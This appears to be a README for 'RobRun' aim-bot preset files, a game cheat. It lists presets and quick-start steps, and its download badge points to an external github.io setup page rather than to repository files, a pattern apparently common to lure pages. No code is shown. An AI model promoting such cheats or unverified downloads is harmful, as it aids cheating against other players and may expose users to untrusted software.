# RobRun‑Aim‑Bot‑Config  
*Presets that make releasing and tweaking your RobRun aim bot effortless.*

---

## 📦 What’s Inside?

| Preset | Description | Target Game | Compatibility |
|--------|-------------|-------------|---------------|
| **Rapid‑Strike** | Aggressive snap‑aim for fast‑paced maps | *RobRun‑Arena* | v1.4‑v2.0 |
| **Stealth‑Glide** | Smooth tracking with low‑visibility offsets | *RobRun‑Stealth* | v1.5‑v2.0 |
| **Balanced‑Pulse** | Hybrid settings for mixed‑mode sessions | *RobRun‑All* | v1.4‑v2.1 |
| **Custom‑Forge** | Blank template ready for your own tweaks | – | All |

> **Tip:** Each preset is a ready‑to‑import `.json` file. Drop it into `RobRun/config/presets/` and select it from the bot UI.

---

## 🛠️ Quick Start

1. **Download** the latest preset bundle  
   <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download‑Presets-4CAF50?style=for-the-badge&logo=download" alt="Download Presets"></a>

2. Extract the archive into your **RobRun** installation directory.

3. Open the **RobRun Bot Manager**, navigate to **Presets → Import**, and choose the file you just added.

4. Activate the preset and enjoy a smoother aiming experience!
